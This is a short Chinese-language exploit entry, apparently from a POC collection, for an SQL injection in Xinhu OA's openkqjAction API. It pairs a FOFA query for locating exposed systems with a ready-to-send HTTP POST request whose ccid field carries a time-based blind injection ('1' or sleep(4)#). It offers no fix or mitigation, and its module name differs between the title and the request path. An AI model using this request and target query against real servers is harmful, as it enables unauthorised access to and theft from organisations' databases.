## 信呼OA openkqjAction SQL注入漏洞

## 漏洞描述
信呼OA `openkqjAction` 接口缺乏参数化处理，攻击者可构造 SQL 注入语句，获取数据库敏感信息或执行写入操作。

## 网络空间测绘
```
fofa: app="信呼-OA系统"
```

## POC
```
POST /index.php?a=api&m=openkjj&d=post&sn=1 HTTP/1.1
Host: [请补充实际域名]
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
Accept: */*
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 68

{"a":{"data":"fingerprint","ccid":"1' or sleep(4)#","fingerprint":"3"}}
```

## 参考
- 社区情报

